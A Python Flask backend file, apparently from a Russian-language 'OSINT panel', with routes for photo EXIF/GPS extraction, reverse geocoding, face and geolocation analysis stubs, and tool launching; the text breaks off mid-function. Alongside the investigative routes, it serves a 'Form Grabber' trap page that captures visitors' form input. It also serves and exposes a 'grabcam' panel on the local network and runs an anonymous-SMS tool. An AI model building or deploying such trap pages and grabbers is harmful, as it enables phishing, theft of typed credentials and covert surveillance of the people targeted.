"""
Точка входа backend: API для панели. Не содержит логики инструментов — только маршруты и вызовы.
"""
import io
import json
import os
import platform
import sys
import zipfile
from urllib.parse import quote, urlparse
from concurrent.futures import ThreadPoolExecutor, as_completed

# Запуск из корня проекта: python backend/app.py
_BACKEND_DIR = os.path.dirname(os.path.abspath(__file__))
_PROJECT_ROOT = os.path.dirname(_BACKEND_DIR)
_GRABCAM_PANEL_DIR = os.path.join(_PROJECT_ROOT, "tools", "grabcam", "panel")
if _BACKEND_DIR not in sys.path:
    sys.path.insert(0, _BACKEND_DIR)

from flask import Flask, request, jsonify, send_from_directory, send_file, Response, redirect
from flask_cors import CORS

from datetime import datetime, timezone, timedelta

from db import init_db, save_run, get_run_history, get_last_successful_run, delete_run, clear_runs
from tools import get_all_tools, get_tool, run_tool
from tools.tool_formgrab import add_capture, get_captures, get_grab_page_html, get_or_create_token
from settings_keys import get_keys_for_api, save_keys_from_api, load_env_into_os

from css_bundle import BUNDLE_TOOL_IDS, build_tool_css_bundle
from url_verify import verify_one_url

import requests
from bs4 import BeautifulSoup

app = Flask(__name__, static_folder="../static", static_url_path="")
CORS(app)

# Инициализация БД и загрузка ключей из .env при старте
init_db()
load_env_into_os()


def _nominatim_reverse_geocode(lat: float, lon: float):
    """Текстовый адрес по координатам (Nominatim). При ошибке сети/ответа — None."""
    try:
        resp = requests.get(
            "https://nominatim.openstreetmap.org/reverse",
            params={"format": "json", "lat": lat, "lon": lon, "zoom": 18, "addressdetails": 1},
            headers={"User-Agent": "OSINT-Panel-EXIF/1.0"},
            timeout=8,
        )
        if resp.status_code != 200:
            return None
        nd = resp.json() or {}
        display_name = (nd.get("display_name") or "").strip()
        address = nd.get("address") if isinstance(nd.get("address"), dict) else {}
        if not display_name and not address:
            return None
        return {"display_name": display_name, "address": address}
    except Exception:
        return None


@app.route("/")
def index():
    return send_from_directory(app.static_folder, "index.html")


@app.route("/p/<tool_id>")
def tool_page_no_slash(tool_id: str):
    """Редирект на URL со слэшем (как у каталога страницы)."""
    return redirect(f"/p/{tool_id}/", code=302)


@app.route("/p/<tool_id>/")
def tool_page(tool_id: str):
    """Отдельная страница инструмента: static/p/<tool_id>/index.html."""
    # legacy: domain-tools теперь автономная страница /domain/
    if tool_id == "domain-tools":
        return redirect("/domain/", code=302)
    base = os.path.join(app.static_folder, "p", tool_id)
    index_path = os.path.join(base, "index.html")
    if not os.path.isfile(index_path):
        return jsonify({"error": "Страница не найдена", "tool_id": tool_id}), 404
    return send_from_directory(base, "index.html")


@app.route("/username")
def username_page_no_slash():
    """Канонический URL страницы Username со слэшем."""
    return redirect("/username/", code=302)


@app.route("/username/")
def username_page():
    """Автономная страница Username: static/username/index.html."""
    base = os.path.join(app.static_folder, "username")
    index_path = os.path.join(base, "index.html")
    if not os.path.isfile(index_path):
        return jsonify({"error": "Страница не найдена", "page": "username"}), 404
    return send_from_directory(base, "index.html")


@app.route("/photo")
def photo_page_no_slash():
    """Канонический URL страницы Фото со слэшем."""
    return redirect("/photo/", code=302)


@app.route("/photo/")
def photo_page():
    """Автономная страница Фото: static/photo/index.html."""
    base = os.path.join(app.static_folder, "photo")
    index_path = os.path.join(base, "index.html")
    if not os.path.isfile(index_path):
        return jsonify({"error": "Страница не найдена", "page": "photo"}), 404
    return send_from_directory(base, "index.html")


@app.route("/domain")
def domain_page_no_slash():
    """Канонический URL страницы Domain tools со слэшем."""
    return redirect("/domain/", code=302)


@app.route("/domain/")
def domain_page():
    """Автономная страница Domain tools: static/domain/index.html."""
    base = os.path.join(app.static_folder, "domain")
    index_path = os.path.join(base, "index.html")
    if not os.path.isfile(index_path):
        return jsonify({"error": "Страница не найдена", "page": "domain"}), 404
    return send_from_directory(base, "index.html")


@app.route("/api/exif", methods=["POST"])
def api_photo_exif():
    """
    EXIF/GPS для страницы Фото.
    Внутри использует инструмент tools/tool_photo_search.py (tool_id = photo-search).
    Body: { imageBase64, exiftool?: bool, geocode?: bool }
    geocode: опционально. По умолчанию (поле не передано или не false) — автоматически
    запрашивать адрес по Nominatim, если в метаданных есть GPS (внешний вызов только при координатах).
    Явный geocode: false — без обращения к Nominatim.
    """
    data = request.get_json(silent=True) or {}
    image_b64 = data.get("imageBase64") or data.get("image_base64") or ""
    # Максимально используем exif_inspector (ExifTool): включён по умолчанию.
    exiftool_enabled = data.get("exiftool")
    exiftool_enabled = True if exiftool_enabled is None else bool(exiftool_enabled)
    # Автогеокод по умолчанию; отключение только явным false (без кнопки на клиенте).
    geocode_enabled = data.get("geocode") is not False

    raw_fn = data.get("filename") or data.get("name") or ""
    safe_filename = None
    if isinstance(raw_fn, str):
        base = raw_fn.strip().replace("\\", "/").split("/")[-1]
        if base and ".." not in base and "\x00" not in base:
            safe_filename = base[:240]

    # Приводим к формату инструмента
    res = run_tool(
        "photo-search",
        {
            "image_base64": image_b64,
            "geocode": geocode_enabled,
            "exiftool": exiftool_enabled,
            "filename": safe_filename,
        },
    )
    if not res.get("success"):
        return jsonify({"success": False, "error": res.get("error") or "EXIF ошибка"}), 400

    gps = res.get("gps") if isinstance(res.get("gps"), dict) else None
    gps_out = None
    if gps and "latitude" in gps and "longitude" in gps:
        lat = float(gps["latitude"])
        lon = float(gps["longitude"])
        gps_out = {
            "latitude": lat,
            "longitude": lon,
            "openStreetMapUrl": f"https://www.openstreetmap.org/?mlat={lat}&mlon={lon}#map=14/{lat}/{lon}",
            "googleMapsUrl": f"https://www.google.com/maps?q={lat},{lon}",
            "yandexMapsUrl": f"https://yandex.ru/maps/?pt={lon},{lat}&z=14&l=map",
            "note": gps.get("note") or "",
        }

    # Fallback: если Pillow-EXIF не дал GPS, пробуем взять координаты из ExifTool (tools/exif_inspector)
    exiftool_blob = res.get("exiftool") if isinstance(res.get("exiftool"), dict) else None
    if not gps_out and exiftool_blob and not exiftool_blob.get("skipped") and not exiftool_blob.get("error"):
        rec = exiftool_blob.get("record") if isinstance(exiftool_blob.get("record"), dict) else {}
        try:
            lat2 = rec.get("Composite:GPSLatitude", {}).get("val") if isinstance(rec.get("Composite:GPSLatitude"), dict) else None
            lon2 = rec.get("Composite:GPSLongitude", {}).get("val") if isinstance(rec.get("Composite:GPSLongitude"), dict) else None
            if lat2 is not None and lon2 is not None:
                lat2 = float(lat2)
                lon2 = float(lon2)
                gps_out = {
                    "latitude": lat2,
                    "longitude": lon2,
                    "openStreetMapUrl": f"https://www.openstreetmap.org/?mlat={lat2}&mlon={lon2}#map=14/{lat2}/{lon2}",
                    "googleMapsUrl": f"https://www.google.com/maps?q={lat2},{lon2}",
                    "yandexMapsUrl": f"https://yandex.ru/maps/?pt={lon2},{lat2}&z=14&l=map",
                    "note": "GPS извлечён из ExifTool (расширенный анализ).",
                }
        except Exception:
            pass

    # Если есть geocode от ExifTool — добавим адресные поля в gps_out
    if gps_out and exiftool_blob and isinstance(exiftool_blob.get("geocode"), dict):
        geo = exiftool_blob.get("geocode") or {}
        if isinstance(geo, dict):
            display_name = (geo.get("display_name") or "").strip()
            addr = geo.get("address") if isinstance(geo.get("address"), dict) else None
            if display_name:
                gps_out["display_name"] = display_name
            if addr:
                gps_out["address"] = addr

    # Координаты из Pillow, а ExifTool отключён / геокод в модуле не сработал — добираем адрес здесь
    if (
        gps_out
        and geocode_enabled
        and not (gps_out.get("display_name") or "").strip()
        and "latitude" in gps_out
        and "longitude" in gps_out
    ):
        fb = _nominatim_reverse_geocode(float(gps_out["latitude"]), float(gps_out["longitude"]))
        if fb:
            if fb.get("display_name"):
                gps_out["display_name"] = fb["display_name"]
            if fb.get("address") and not gps_out.get("address"):
                gps_out["address"] = fb["address"]

    exif_summary = res.get("exif_summary") if isinstance(res.get("exif_summary"), dict) else {}
    camera_keys = ("Make", "Model", "LensModel", "BodySerialNumber")
    dates_keys = ("DateTime", "DateTimeOriginal", "DateTimeDigitized")
    soft_keys = ("Software", "Artist", "Copyright")
    camera = {k: exif_summary.get(k) for k in camera_keys if exif_summary.get(k) not in (None, "")}
    dates = {k: exif_summary.get(k) for k in dates_keys if exif_summary.get(k) not in (None, "")}
    software = {k: exif_summary.get(k) for k in soft_keys if exif_summary.get(k) not in (None, "")}

    shoot_keys = (
        "ISOSpeedRatings",
        "PhotographicSensitivity",
        "ExposureTime",
        "FNumber",
        "FocalLength",
        "FocalLengthIn35mmFilm",
        "Flash",
        "WhiteBalance",
        "MeteringMode",
        "ExposureProgram",
        "Orientation",
    )
    def _shoot_json(v):
        try:
            if hasattr(v, "numerator") and hasattr(v, "denominator"):
                n, d = int(v.numerator), int(v.denominator)
                return [n, d] if d else n
        except Exception:
            pass
        if isinstance(v, (bytes, bytearray)):
            return v.decode("utf-8", errors="replace")
        return v

    shooting = {}
    for k in shoot_keys:
        v = exif_summary.get(k)
        if v in (None, ""):
            continue
        if isinstance(v, (list, tuple)) and len(v) == 0:
            continue
        shooting[k] = _shoot_json(v)

    # Риски приватности (для UI)
    privacy = []
    if gps_out:
        privacy.append("GPS координаты присутствуют (может раскрыть место съёмки).")
    if exif_summary.get("BodySerialNumber"):
        privacy.append("Серийный номер корпуса/камеры присутствует.")
    if exif_summary.get("ImageUniqueID"):
        privacy.append("ImageUniqueID присутствует (может быть уникальным идентификатором).")
    if exif_summary.get("Artist"):
        privacy.append("Поле Artist присутствует (автор/владелец).")
    if exif_summary.get("Copyright"):
        privacy.append("Поле Copyright присутствует (правообладатель).")
    if exif_summary.get("Software"):
        privacy.append("Поле Software присутствует (ПО/устройство).")

    # В UI не нужны мегабайты detective_report / formatted / record — только факт ошибки ExifTool
    et_full = res.get("exiftool")
    exiftool_lite = None
    if isinstance(et_full, dict):
        exiftool_lite = {}
        if et_full.get("error"):
            exiftool_lite["error"] = et_full["error"]
        if et_full.get("skipped"):
            exiftool_lite["skipped"] = True

    exiftool_tag_count = None
    if isinstance(et_full, dict) and isinstance(et_full.get("record"), dict):
        exiftool_tag_count = len(et_full["record"])

    return jsonify(
        {
            "success": True,
            "gps": gps_out,
            "camera": camera,
            "dates": dates,
            "software": software,
            "shooting": shooting,
            "privacy": privacy,
            "hashes": res.get("hashes"),
            "perceptual": res.get("perceptual"),
            "meta": res.get("meta"),
            "file_stats": res.get("file_stats"),
            "exiftool_tag_count": exiftool_tag_count,
            "exiftool": exiftool_lite if exiftool_lite else None,
        }
    )


@app.route("/api/exif/strip", methods=["POST"])
def api_photo_exif_strip():
    """Скачать изображение без EXIF/XMP/ICC. Body: { imageBase64 }."""
    data = request.get_json(silent=True) or {}
    image_b64 = data.get("imageBase64") or data.get("image_base64") or ""
    if not image_b64:
        return jsonify({"success": False, "error": "imageBase64 обязателен"}), 400
    try:
        import base64
        import io
        from PIL import Image

        # data URL -> raw base64
        s = str(image_b64).strip()
        if s.startswith("data:"):
            comma = s.find(",")
            if comma != -1:
                s = s[comma + 1 :]
        raw = base64.b64decode(s, validate=False)
        with Image.open(io.BytesIO(raw)) as img:
            img.load()
            fmt = (img.format or "PNG").upper()
            # сохраняем “чисто”, без info/exif
            out = io.BytesIO()
            save_fmt = "JPEG" if fmt in {"JPG", "JPEG"} else ("PNG" if fmt == "PNG" else "PNG")
            if save_fmt == "JPEG":
                rgb = img.convert("RGB")
                rgb.save(out, format="JPEG", quality=92, optimize=True)
                mime = "image/jpeg"
                fname = "clean.jpg"
            else:
                img.save(out, format="PNG", optimize=True)
                mime = "image/png"
                fname = "clean.png"
        out.seek(0)
        return send_file(out, mimetype=mime, as_attachment=True, download_name=fname)
    except Exception as e:
        return jsonify({"success": False, "error": str(e)}), 500


@app.route("/api/exif/exiftool/json", methods=["POST"])
def api_photo_exif_exiftool_json():
    """
    Полный дамп ExifTool (record) для страницы Фото.
    Body: { imageBase64, exiftool?: bool, geocode?: bool, filename?: str }
    """
    data = request.get_json(silent=True) or {}
    image_b64 = data.get("imageBase64") or data.get("image_base64") or ""
    if not image_b64:
        return jsonify({"success": False, "error": "imageBase64 обязателен"}), 400

    exiftool_enabled = data.get("exiftool")
    exiftool_enabled = True if exiftool_enabled is None else bool(exiftool_enabled)
    geocode_enabled = data.get("geocode") is not False

    raw_fn = data.get("filename") or data.get("name") or ""
    safe_filename = None
    if isinstance(raw_fn, str):
        base = raw_fn.strip().replace("\\", "/").split("/")[-1]
        if base and ".." not in base and "\x00" not in base:
            safe_filename = base[:240]

    res = run_tool(
        "photo-search",
        {
            "image_base64": image_b64,
            "geocode": geocode_enabled,
            "exiftool": exiftool_enabled,
            "filename": safe_filename,
        },
    )
    if not res.get("success"):
        return jsonify({"success": False, "error": res.get("error") or "EXIF ошибка"}), 400

    et_full = res.get("exiftool")
    if not isinstance(et_full, dict) or et_full.get("skipped") or et_full.get("error"):
        return jsonify({"success": False, "error": (et_full or {}).get("error") or "ExifTool недоступен"}), 400

    record = et_full.get("record") if isinstance(et_full.get("record"), dict) else None
    if record is None:
        return jsonify({"success": False, "error": "ExifTool record отсутствует"}), 400

    return jsonify(
        {
            "success": True,
            "tag_count": et_full.get("tag_count") or len(record),
            "record_truncated": bool(et_full.get("record_truncated")),
            "record": record,
        }
    )


@app.route("/api/exif/exiftool/txt", methods=["POST"])
def api_photo_exif_exiftool_txt():
    """
    Скачать форматированный текст ExifTool для страницы Фото.
    Body: { imageBase64, exiftool?: bool, geocode?: bool, filename?: str }
    """
    data = request.get_json(silent=True) or {}
    image_b64 = data.get("imageBase64") or data.get("image_base64") or ""
    if not image_b64:
        return jsonify({"success": False, "error": "imageBase64 обязателен"}), 400

    exiftool_enabled = data.get("exiftool")
    exiftool_enabled = True if exiftool_enabled is None else bool(exiftool_enabled)
    geocode_enabled = data.get("geocode") is not False

    raw_fn = data.get("filename") or data.get("name") or ""
    safe_filename = None
    if isinstance(raw_fn, str):
        base = raw_fn.strip().replace("\\", "/").split("/")[-1]
        if base and ".." not in base and "\x00" not in base:
            safe_filename = base[:240]

    res = run_tool(
        "photo-search",
        {
            "image_base64": image_b64,
            "geocode": geocode_enabled,
            "exiftool": exiftool_enabled,
            "filename": safe_filename,
        },
    )
    if not res.get("success"):
        return jsonify({"success": False, "error": res.get("error") or "EXIF ошибка"}), 400

    et_full = res.get("exiftool")
    if not isinstance(et_full, dict) or et_full.get("skipped") or et_full.get("error"):
        return jsonify({"success": False, "error": (et_full or {}).get("error") or "ExifTool недоступен"}), 400

    txt = (et_full.get("formatted_text") or "").strip()
    if not txt:
        # fallback: минимальный вывод из record
        rec = et_full.get("record") if isinstance(et_full.get("record"), dict) else {}
        lines = []
        for k, v in rec.items():
            try:
                if isinstance(v, dict) and "val" in v:
                    vv = v.get("val")
                elif isinstance(v, dict) and "value" in v:
                    vv = v.get("value")
                else:
                    vv = v
            except Exception:
                vv = v
            lines.append(f"{k}: {vv}")
        txt = "\n".join(lines) or "Метаданные не найдены."

    fname = "exiftool.txt"
    if safe_filename:
        stem = safe_filename.rsplit(".", 1)[0]
        if stem:
            fname = f"{stem}.exiftool.txt"

    from flask import Response  # noqa: PLC0415

    resp = Response(txt, mimetype="text/plain; charset=utf-8")
    resp.headers["Content-Disposition"] = f'attachment; filename="{fname}"'
    return resp


@app.route("/api/reverse-search", methods=["POST"])
def api_photo_reverse_search():
    """Генерирует ссылки на reverse image search. Body: { imageUrl }."""
    data = request.get_json(silent=True) or {}
    image_url = (data.get("imageUrl") or "").strip()
    if not image_url:
        return jsonify({"success": False, "error": "imageUrl обязателен"}), 400
    q = quote(image_url, safe="")
    links = {
        "googleImages": f"https://lens.google.com/uploadbyurl?url={q}",
        "yandexImages": f"https://yandex.ru/images/search?rpt=imageview&url={q}",
        "bingVisual": f"https://www.bing.com/images/search?q=imgurl:{q}&view=detailv2&iss=sbi",
        "tineye": f"https://tineye.com/search?url={q}",
        "baidu": f"https://image.baidu.com/n/pc_search?queryImageUrl={q}",
    }
    return jsonify({"success": True, "links": links})


@app.route("/api/search", methods=["POST"])
def api_photo_web_search():
    """Заглушка под websearch на странице Фото. Body: { queries: string[] }."""
    # В проекте нет серверного веб-поиска под этот формат; возвращаем корректный JSON.
    data = request.get_json(silent=True) or {}
    queries = data.get("queries") or []
    if not isinstance(queries, list):
        return jsonify({"success": False, "error": "queries must be list"}), 400
    return jsonify({"success": True, "results": [{"query": str(q), "results": []} for q in queries[:10]]})


@app.route("/api/export-report", methods=["POST"])
def api_photo_export_report():
    """Экспорт отчёта для страницы Фото (минимальный Markdown)."""
    data = request.get_json(silent=True) or {}
    results = data.get("results") or {}
    search_results = data.get("searchResults") or []
    image_url = (data.get("imageUrl") or "").strip()

    # Минимальный отчёт, без сложной логики.
    lines = ["# OSINT Фото — отчёт", ""]
    if image_url:
        lines += [f"**Image URL**: {image_url}", ""]
    if isinstance(results, dict) and results:
        lines += ["## Результаты", ""]
        for k in sorted(results.keys()):
            v = results.get(k)
            try:
                preview = json.dumps(v, ensure_ascii=False, indent=2)[:4000]
            except Exception:
                preview = str(v)[:4000]
            lines += [f"### {k}", "", "```json", preview, "```", ""]
    if isinstance(search_results, list) and search_results:
        lines += ["## Web search", "", "```json", json.dumps(search_results, ensure_ascii=False, indent=2)[:4000], "```", ""]
    return jsonify({"success": True, "report": "\n".join(lines)})


# AI/VLM endpoints в текущем проекте не реализованы — отдаём JSON, чтобы фронт не падал на HTML.
@app.route("/api/analyze", methods=["POST"])
def api_photo_analyze():
    data = request.get_json(silent=True) or {}
    image_url = (data.get("imageUrl") or data.get("image_url") or "").strip()
    image_b64 = data.get("imageBase64") or data.get("image_base64") or ""
    img = image_url or (str(image_b64).strip() or "")
    if not img:
        return jsonify({"success": False, "error": "Нужно передать imageUrl или imageBase64."}), 400
    res = run_tool("photo-ai", {"task": "analysis", "image_url": img})
    if not res.get("success"):
        return jsonify({"success": False, "error": res.get("error") or "AI ошибка"}), 400
    return jsonify({"success": True, "analysis": res.get("analysis") or "", "provider": res.get("provider")})


@app.route("/api/deep-analysis", methods=["POST"])
def api_photo_deep():
    data = request.get_json(silent=True) or {}
    image_url = (data.get("imageUrl") or data.get("image_url") or "").strip()
    image_b64 = data.get("imageBase64") or data.get("image_base64") or ""
    img = image_url or (str(image_b64).strip() or "")
    if not img:
        return jsonify({"success": False, "error": "Нужно передать imageUrl или imageBase64."}), 400
    res = run_tool("photo-ai", {"task": "deep", "image_url": img})
    if not res.get("success"):
        return jsonify({"success": False, "error": res.get("error") or "AI ошибка"}), 400
    return jsonify(res)


@app.route("/api/face", methods=["POST"])
def api_photo_face():
    data = request.get_json(silent=True) or {}
    image_url = (data.get("imageUrl") or data.get("image_url") or "").strip()
    image_b64 = data.get("imageBase64") or data.get("image_base64") or ""
    img = image_url or (str(image_b64).strip() or "")
    if not img:
        return jsonify({"success": False, "error": "Нужно передать imageUrl или imageBase64."}), 400
    res = run_tool("photo-ai", {"task": "face", "image_url": img})
    if not res.get("success"):
        return jsonify({"success": False, "error": res.get("error") or "AI ошибка"}), 400
    return jsonify(res)


@app.route("/api/threat", methods=["POST"])
def api_photo_threat():
    data = request.get_json(silent=True) or {}
    image_url = (data.get("imageUrl") or data.get("image_url") or "").strip()
    image_b64 = data.get("imageBase64") or data.get("image_base64") or ""
    img = image_url or (str(image_b64).strip() or "")
    if not img:
        return jsonify({"success": False, "error": "Нужно передать imageUrl или imageBase64."}), 400
    res = run_tool("photo-ai", {"task": "threat", "image_url": img})
    if not res.get("success"):
        return jsonify({"success": False, "error": res.get("error") or "AI ошибка"}), 400
    return jsonify(res)


@app.route("/api/object-inventory", methods=["POST"])
def api_photo_inventory():
    data = request.get_json(silent=True) or {}
    image_url = (data.get("imageUrl") or data.get("image_url") or "").strip()
    image_b64 = data.get("imageBase64") or data.get("image_base64") or ""
    img = image_url or (str(image_b64).strip() or "")
    if not img:
        return jsonify({"success": False, "error": "Нужно передать imageUrl или imageBase64."}), 400
    res = run_tool("photo-ai", {"task": "inventory", "image_url": img})
    if not res.get("success"):
        return jsonify({"success": False, "error": res.get("error") or "AI ошибка"}), 400
    return jsonify(res)


@app.route("/api/geolocate", methods=["POST"])
def api_photo_geolocate():
    data = request.get_json(silent=True) or {}
    image_url = (data.get("imageUrl") or data.get("image_url") or "").strip()
    image_b64 = data.get("imageBase64") or data.get("image_base64") or ""
    img = image_url or (str(image_b64).strip() or "")
    if not img:
        return jsonify({"success": False, "error": "Нужно передать imageUrl или imageBase64."}), 400
    res = run_tool("photo-ai", {"task": "geolocate", "image_url": img})
    if not res.get("success"):
        return jsonify({"success": False, "error": res.get("error") or "AI ошибка"}), 400
    return jsonify(res)


@app.route("/api/ocr", methods=["POST"])
def api_photo_ocr():
    # Офлайн OCR (Tesseract). Требует загруженный файл (base64).
    data = request.get_json(silent=True) or {}
    image_b64 = data.get("imageBase64") or data.get("image_base64") or ""
    if not image_b64:
        return jsonify({"success": False, "error": "OCR офлайн: передайте imageBase64 (файл), URL пока не поддерживается."}), 400
    lang = (data.get("lang") or "eng+rus").strip()
    res = run_tool("photo-ocr", {"image_base64": image_b64, "lang": lang})
    if not res.get("success"):
        return jsonify({"success": False, "error": res.get("error") or "OCR ошибка"}), 400
    return jsonify(res)


@app.route("/api/qr-barcode", methods=["POST"])
def api_photo_qr():
    # Офлайн QR/штрихкоды (pyzbar/zbar). Требует загруженный файл (base64).
    data = request.get_json(silent=True) or {}
    image_b64 = data.get("imageBase64") or data.get("image_base64") or ""
    if not image_b64:
        return jsonify({"success": False, "error": "QR офлайн: передайте imageBase64 (файл), URL пока не поддерживается."}), 400
    res = run_tool("photo-qr", {"image_base64": image_b64})
    if not res.get("success"):
        return jsonify({"success": False, "error": res.get("error") or "QR ошибка"}), 400
    return jsonify(res)


@app.route("/api/brand-logo", methods=["POST"])
def api_photo_brand():
    data = request.get_json(silent=True) or {}
    image_url = (data.get("imageUrl") or data.get("image_url") or "").strip()
    image_b64 = data.get("imageBase64") or data.get("image_base64") or ""
    img = image_url or (str(image_b64).strip() or "")
    if not img:
        return jsonify({"success": False, "error": "Нужно передать imageUrl или imageBase64."}), 400
    res = run_tool("photo-ai", {"task": "brand", "image_url": img})
    if not res.get("success"):
        return jsonify({"success": False, "error": res.get("error") or "AI ошибка"}), 400
    return jsonify(res)


@app.route("/api/vehicle", methods=["POST"])
def api_photo_vehicle():
    data = request.get_json(silent=True) or {}
    image_url = (data.get("imageUrl") or data.get("image_url") or "").strip()
    image_b64 = data.get("imageBase64") or data.get("image_base64") or ""
    img = image_url or (str(image_b64).strip() or "")
    if not img:
        return jsonify({"success": False, "error": "Нужно передать imageUrl или imageBase64."}), 400
    res = run_tool("photo-ai", {"task": "vehicle", "image_url": img})
    if not res.get("success"):
        return jsonify({"success": False, "error": res.get("error") or "AI ошибка"}), 400
    return jsonify(res)


@app.route("/api/cultural", methods=["POST"])
def api_photo_cultural():
    data = request.get_json(silent=True) or {}
    image_url = (data.get("imageUrl") or data.get("image_url") or "").strip()
    image_b64 = data.get("imageBase64") or data.get("image_base64") or ""
    img = image_url or (str(image_b64).strip() or "")
    if not img:
        return jsonify({"success": False, "error": "Нужно передать imageUrl или imageBase64."}), 400
    res = run_tool("photo-ai", {"task": "cultural", "image_url": img})
    if not res.get("success"):
        return jsonify({"success": False, "error": res.get("error") or "AI ошибка"}), 400
    return jsonify(res)


@app.route("/api/social-search", methods=["POST"])
def api_photo_social():
    data = request.get_json(silent=True) or {}
    image_url = (data.get("imageUrl") or data.get("image_url") or "").strip()
    image_b64 = data.get("imageBase64") or data.get("image_base64") or ""
    img = image_url or (str(image_b64).strip() or "")
    if not img:
        return jsonify({"success": False, "error": "Нужно передать imageUrl или imageBase64."}), 400
    res = run_tool("photo-ai", {"task": "social", "image_url": img})
    if not res.get("success"):
        return jsonify({"success": False, "error": res.get("error") or "AI ошибка"}), 400
    return jsonify(res)


@app.route("/api/architecture", methods=["POST"])
def api_photo_architecture():
    data = request.get_json(silent=True) or {}
    image_url = (data.get("imageUrl") or data.get("image_url") or "").strip()
    image_b64 = data.get("imageBase64") or data.get("image_base64") or ""
    img = image_url or (str(image_b64).strip() or "")
    if not img:
        return jsonify({"success": False, "error": "Нужно передать imageUrl или imageBase64."}), 400
    res = run_tool("photo-ai", {"task": "architecture", "image_url": img})
    if not res.get("success"):
        return jsonify({"success": False, "error": res.get("error") or "AI ошибка"}), 400
    return jsonify(res)


@app.route("/api/vegetation", methods=["POST"])
def api_photo_vegetation():
    data = request.get_json(silent=True) or {}
    image_url = (data.get("imageUrl") or data.get("image_url") or "").strip()
    image_b64 = data.get("imageBase64") or data.get("image_base64") or ""
    img = image_url or (str(image_b64).strip() or "")
    if not img:
        return jsonify({"success": False, "error": "Нужно передать imageUrl или imageBase64."}), 400
    res = run_tool("photo-ai", {"task": "vegetation", "image_url": img})
    if not res.get("success"):
        return jsonify({"success": False, "error": res.get("error") or "AI ошибка"}), 400
    return jsonify(res)


@app.route("/api/timestamp", methods=["POST"])
def api_photo_timestamp():
    data = request.get_json(silent=True) or {}
    image_url = (data.get("imageUrl") or data.get("image_url") or "").strip()
    image_b64 = data.get("imageBase64") or data.get("image_base64") or ""
    img = image_url or (str(image_b64).strip() or "")
    if not img:
        return jsonify({"success": False, "error": "Нужно передать imageUrl или imageBase64."}), 400
    res = run_tool("photo-ai", {"task": "timestamp", "image_url": img})
    if not res.get("success"):
        return jsonify({"success": False, "error": res.get("error") or "AI ошибка"}), 400
    return jsonify(res)


@app.route("/api/weather", methods=["POST"])
def api_photo_weather():
    data = request.get_json(silent=True) or {}
    image_url = (data.get("imageUrl") or data.get("image_url") or "").strip()
    image_b64 = data.get("imageBase64") or data.get("image_base64") or ""
    img = image_url or (str(image_b64).strip() or "")
    if not img:
        return jsonify({"success": False, "error": "Нужно передать imageUrl или imageBase64."}), 400
    res = run_tool("photo-ai", {"task": "weather", "image_url": img})
    if not res.get("success"):
        return jsonify({"success": False, "error": res.get("error") or "AI ошибка"}), 400
    return jsonify(res)


@app.route("/api/ui/host-os")
def api_host_os():
    """ОС и ядро машины, на которой запущен backend (как `uname`)."""
    try:
        u = platform.uname()
        return jsonify(
            {
                "system": u.system,
                "release": u.release,
                "version": u.version,
                "machine": u.machine,
                "node": u.node,
            }
        )
    except OSError as e:
        return jsonify({"error": str(e)}), 500


@app.route("/css/tool-bundle/<tool_id>.css")
def tool_css_bundle(tool_id: str):
    """Один CSS на вкладку: общая база + стили инструмента (без цепочки link в HTML)."""
    if tool_id not in BUNDLE_TOOL_IDS:
        return Response("/* unknown tool bundle */\n", status=404, mimetype="text/css; charset=utf-8")
    try:
        body = build_tool_css_bundle(
            static_root=app.static_folder,
            grabcam_panel_dir=_GRABCAM_PANEL_DIR,
            tool_id=tool_id,
        )
    except OSError as e:
        return Response(f"/* bundle error: {e} */\n", status=500, mimetype="text/css; charset=utf-8")
    return Response(
        body,
        mimetype="text/css; charset=utf-8",
        headers={"Cache-Control": "public, max-age=120"},
    )


# Страница-ловушка для захвата ввода в формах (Form Grabber)
@app.route("/grab/<token>")
def grab_page(token):
    html = get_grab_page_html(token)
    return Response(html, mimetype="text/html; charset=utf-8")


@app.route("/grabcam/panel/<path:path>")
def grabcam_panel_static(path):
    """Раздача статики панели Grabcam из tools/grabcam/panel/ (модуль в своей директории)."""
    return send_from_directory(_GRABCAM_PANEL_DIR, path)


# --- API ---

@app.route("/api/tools", methods=["GET"])
def api_tools_list():
    """Список доступных инструментов."""
    return jsonify(get_all_tools())


@app.route("/api/tools/<tool_id>/run", methods=["POST"])
def api_tool_run(tool_id):
    """Запуск инструмента. Body: JSON с параметрами. При неизвестном tool_id — 404 с error."""
    data = request.get_json(silent=True) or {}
    result = run_tool(tool_id, data)
    if not result.get("started"):
        save_run(tool_id, data, result if result.get("success") else None, result.get("error"))
    if tool_id == "grabcam" and result.get("local_url"):
        # Сохраняем порт из local_url, но подставляем хост запроса (для доступа из локальной сети).
        host = (request.host or "127.0.0.1:5000").split(":")[0]
        try:
            u = urlparse(result["local_url"])
            port = u.port or 3333
        except Exception:
            port = 3333
        result["local_url"] = "http://{}:{}".format(host, port)
    if not result.get("success") and result.get("error") == f"Unknown tool: {tool_id}":
        return jsonify({"error": result["error"]}), 404
    return jsonify(result)


@app.route("/api/verify/links", methods=["POST"])
def api_verify_links():
    """Проверка URL (серверная, с SSRF-защитой). Body: { urls: string[], timeout_sec?, max_workers? }"""
    data = request.get_json(silent=True) or {}
    urls = data.get("urls") or []
    if not isinstance(urls, list):
        return jsonify({"error": "urls must be list"}), 400
    urls = [str(u).strip() for u in urls if str(u).strip()]
    urls = urls[:150]
    timeout_sec = float(data.get("timeout_sec") or 6.0)
    timeout_sec = max(2.0, min(12.0, timeout_sec))
    max_workers = int(data.get("max_workers") or 18)
    max_workers = max(4, min(32, max_workers))
    out = []
    with ThreadPoolExecutor(max_workers=max_workers) as ex:
        futs = [ex.submit(verify_one_url, u, timeout_sec) for u in urls]
        for f in as_completed(futs):
            out.append(f.result())
    return jsonify({"success": True, "count": len(out), "results": out})


@app.route("/api/history", methods=["GET"])
def api_history():
    """История запусков. Query: ?tool_id=anonsms (опционально), ?limit=50."""
    tool_id = request.args.get("tool_id")
    limit = min(int(request.args.get("limit", 50) or 50), 200)
    return jsonify(get_run_history(tool_id=tool_id, limit=limit))


@app.route("/api/history/<int:run_id>", methods=["DELETE"])
def api_history_delete(run_id: int):
    """Удалить один элемент истории."""
    ok = delete_run(run_id)
    return jsonify({"success": ok})


@app.route("/api/history/clear", methods=["POST"])
def api_history_clear():
    """Очистить историю. Body: { tool_id?: "..." }."""
    data = request.get_json(silent=True) or {}
    tool_id = (data.get("tool_id") or "").strip() or None
    deleted = clear_runs(tool_id=tool_id)
    return jsonify({"success": True, "deleted": deleted})


@app.route("/api/tools/anonsms/status", methods=["GET"])
def api_anonsms_status():
    """Можно ли отправить бесплатное SMS (24 ч после последней успешной отправки)."""
    last = get_last_successful_run("anonsms")
    if not last:
